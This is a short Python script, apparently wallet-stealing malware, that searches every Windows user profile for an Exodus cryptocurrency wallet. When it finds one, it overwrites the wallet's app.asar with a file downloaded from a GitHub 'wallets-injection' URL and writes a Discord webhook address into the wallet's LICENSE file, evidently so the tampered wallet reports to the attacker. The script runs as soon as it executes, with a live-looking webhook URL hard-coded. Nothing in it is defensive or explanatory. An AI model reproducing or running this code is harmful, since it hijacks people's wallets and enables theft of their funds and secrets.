import os
import glob
import requests
os.system('pip insall requests')

def exodus_injection(exodus_injection_url, webhook):
    for user in get_users():
        exodus_path = os.path.join(user, "AppData", "Local", "exodus")
        if not is_dir(exodus_path):
            continue

        files = glob.glob(os.path.join(exodus_path, "app-*"))
        if not files:
            continue

        exodus_path = files[0]

        exodus_asar_path = os.path.join(exodus_path, "resources", "app.asar")
        exodus_license_path = os.path.join(exodus_path, "LICENSE")

        if not exists(exodus_asar_path):
            continue

        injection(exodus_asar_path, exodus_license_path, exodus_injection_url, webhook)

def injection(path, license_path, injection_url, webhook):
    if not exists(path):
        return

    try:
        resp = requests.get(injection_url)
        if resp.status_code != 200:
            return
    except:
        return

    try:
        with open(path, 'wb') as out:
            out.write(resp.content)
    except:
        return

    try:
        with open(license_path, 'w') as license_file:
            license_file.write(webhook)
    except:
        return

def get_users():
    users_dir = os.path.expandvars(r'%SystemDrive%\Users')
    if not os.path.isdir(users_dir):
        return []
    return [os.path.join(users_dir, user) for user in os.listdir(users_dir) if os.path.isdir(os.path.join(users_dir, user))]

def is_dir(path):
    return os.path.isdir(path)

def exists(path):
    return os.path.exists(path)

exodus_injection("https://github.com/hackirby/wallets-injection/raw/main/exodus.asar", 'https://discord.com/api/webhooks/1424469522588631141/RbnhHfpMTD1QzSqb8Xu3GqosHHRxyptASycdP7_YsvDxCfLBfraLKssZWNC649Vm-JY9')
